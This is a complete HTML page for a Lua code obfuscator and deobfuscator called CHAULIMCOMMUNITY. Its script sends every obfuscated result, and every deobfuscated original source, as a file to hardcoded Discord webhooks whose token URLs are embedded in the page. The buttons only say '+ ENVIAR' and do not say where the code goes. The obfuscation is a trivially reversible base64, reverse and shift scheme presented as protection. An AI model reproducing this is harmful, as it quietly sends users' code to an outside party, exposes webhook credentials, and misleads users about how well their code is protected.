<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHAULIMCOMMUNITY • Obfuscator & Deobfuscator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { font-family: 'Inter', system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); min-height: 100vh; }
        .glass { background: rgba(15, 15, 25, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        textarea { font-family: ui-monospace, monospace; font-size: 15px; line-height: 1.5; }
        .tab-active { border-bottom: 3px solid #ff003c; color: white; }
    </style>
</head>
<body class="text-white">
    <div class="min-h-screen p-4 md:p-8">
        <div class="max-w-7xl mx-auto">
            
            <div class="flex justify-between items-center mb-10">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-gradient-to-br from-pink-500 via-purple-600 to-violet-600 rounded-3xl flex items-center justify-center text-3xl font-bold">C</div>
                    <div>
                        <h1 class="text-4xl font-bold">CHAULIMCOMMUNITY</h1>
                        <p class="text-gray-400">Obfuscator & Deobfuscator</p>
                    </div>
                </div>
            </div>

            <!-- Tabs -->
            <div class="flex border-b border-zinc-700 mb-8">
                <button onclick="switchTab(0)" id="tab0" class="tab-active px-10 py-4 text-lg font-semibold">OFUSCAR</button>
                <button onclick="switchTab(1)" id="tab1" class="px-10 py-4 text-lg font-semibold text-gray-400 hover:text-white">DESOFUSCAR</button>
            </div>

            <!-- OFUSCAR -->
            <div id="panel0">
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div class="glass rounded-3xl p-8">
                        <h2 class="text-2xl mb-4">Código Original</h2>
                        <textarea id="input-obf" rows="15" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-6" placeholder="Cole seu código Lua..."></textarea>
                        <button onclick="obfuscate()" class="mt-6 w-full bg-gradient-to-r from-pink-600 to-purple-600 py-5 rounded-2xl font-bold text-lg">OFUSCAR + ENVIAR</button>
                    </div>
                    <div class="glass rounded-3xl p-8">
                        <h2 class="text-2xl mb-4">Código Ofuscado</h2>
                        <textarea id="output-obf" rows="15" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-6"></textarea>
                    </div>
                </div>
            </div>

            <!-- DESOFUSCAR -->
            <div id="panel1" class="hidden">
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div class="glass rounded-3xl p-8">
                        <h2 class="text-2xl mb-4">Código Ofuscado</h2>
                        <textarea id="input-deobf" rows="15" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-6" placeholder="Cole o código ofuscado..."></textarea>
                        <button onclick="deobfuscate()" class="mt-6 w-full bg-gradient-to-r from-emerald-600 to-cyan-600 py-5 rounded-2xl font-bold text-lg">DESOFUSCAR + ENVIAR</button>
                    </div>
                    <div class="glass rounded-3xl p-8">
                        <h2 class="text-2xl mb-4">Código Original Recuperado</h2>
                        <textarea id="output-deobf" rows="15" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-6"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ==================== WEBHOOKS ====================
        const WEBHOOK_OBF = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
        const WEBHOOK_DEOBF = "https://discord.com/api/webhooks/1518437418234155189/BOdfLdMoa8FOKh0qKrUNAutq8uy6a8niBoWnOHyKKFeNO19vRWCTlrde9FkbMdtEn46q";

        async function sendToDiscord(webhook, title, content, filename) {
            if (!webhook) return;

            const blob = new Blob([content], { type: "text/plain" });
            const formData = new FormData();
            
            formData.append("payload_json", JSON.stringify({
                username: "CHAULIMCOMMUNITY",
                content: `**${title}**`,
            }));
            formData.append("file", blob, filename);

            try {
                await fetch(webhook, { method: "POST", body: formData });
                console.log("✅ Arquivo enviado com sucesso!");
            } catch (e) {
                console.error("Erro ao enviar arquivo:", e);
            }
        }

        // ==================== OFUSCATOR ====================
        function rand() {
            let c = "abcdefghijklmnopqrstuvwxyz";
            let n = "_ch_";
            for(let i = 0; i < 12; i++) n += c[Math.floor(Math.random() * c.length)];
            return n;
        }

        function obfuscate() {
            let code = document.getElementById("input-obf").value.trim();
            if (!code) return alert("❌ Cole um código Lua!");

            let c1 = btoa(unescape(encodeURIComponent(code)));
            let c2 = c1.split("").reverse().join("");
            let c3 = "";
            for(let i = 0; i < c2.length; i++) c3 += String.fromCharCode(c2.charCodeAt(i) + 2);
            let bytes = Array.from(c3).map(c => c.charCodeAt(0));

            let v = rand(), f1 = rand(), f2 = rand(), f3 = rand(), exec = rand();

            let lua = `local ${v} = {${bytes.join(",")}}

local function ${f1}(t)
 local s="" for i=1,#t do s=s..string.char(t[i]) end return s
end

local function ${f2}(s)
 local r="" for i=1,#s do r=r..string.char(s:byte(i)-2) end return r
end

local function ${f3}(s) return s:reverse() end

local function b64d(data)
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
 data = data:gsub('[^'..b..'=]', '')
 return (data:gsub('.', function(x)
  if x=='=' then return '' end
  local r,f='',b:find(x)-1
  for i=6,1,-1 do r=r..(f%(2^i)-f%(2^(i-1))>0 and '1' or '0') end
  return r
 end):gsub('%d%d%d%d%d%d%d%d', function(x)
  local c=0
  for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
  return string.char(c)
 end))
end

local ok,err=pcall(function()
 local s=${f1}(${v})
 s=${f2}(s)
 s=${f3}(s)
 s=b64d(s)
 local ${exec}=load(s) if ${exec} then ${exec}() end
end)
if not ok then print("CHAULIM ERROR: "..tostring(err)) end`;

            const result = lua.trim();
            document.getElementById("output-obf").value = result;

            sendToDiscord(WEBHOOK_OBF, "🛡️ Novo Código Ofuscado", result, "CHAULIM_ofuscado.lua");
            alert("✅ Ofuscação concluída e enviada como arquivo!");
        }

        // ==================== DESOFUSCATOR ====================
        function deobfuscate() {
            let obfuscated = document.getElementById("input-deobf").value.trim();
            if (!obfuscated) return alert("❌ Cole o código ofuscado!");

            try {
                const match = obfuscated.match(/local _ch_[a-z]+ = \{(.+?)\}/s);
                if (!match) return alert("❌ Formato inválido!");

                const bytes = match[1].split(',').map(n => parseInt(n.trim()));
                let str = bytes.map(b => String.fromCharCode(b)).join('');

                let unshift = "";
                for (let i = 0; i < str.length; i++) unshift += String.fromCharCode(str.charCodeAt(i) - 2);

                let rev = unshift.split('').reverse().join('');
                let original = decodeURIComponent(escape(atob(rev)));

                document.getElementById("output-deobf").value = original;

                sendToDiscord(WEBHOOK_DEOBF, "🔓 Código Desofuscado", original, "CHAULIM_recuperado.lua");
                alert("✅ Desofuscação concluída e enviada como arquivo!");
            } catch (e) {
                alert("❌ Erro ao desofuscar:\n" + e.message);
            }
        }

        function switchTab(n) {
            document.getElementById('panel0').classList.toggle('hidden', n !== 0);
            document.getElementById('panel1').classList.toggle('hidden', n !== 1);
            document.getElementById('tab0').classList.toggle('tab-active', n === 0);
            document.getElementById('tab1').classList.toggle('tab-active', n === 1);
        }
    </script>
</body>
</html>
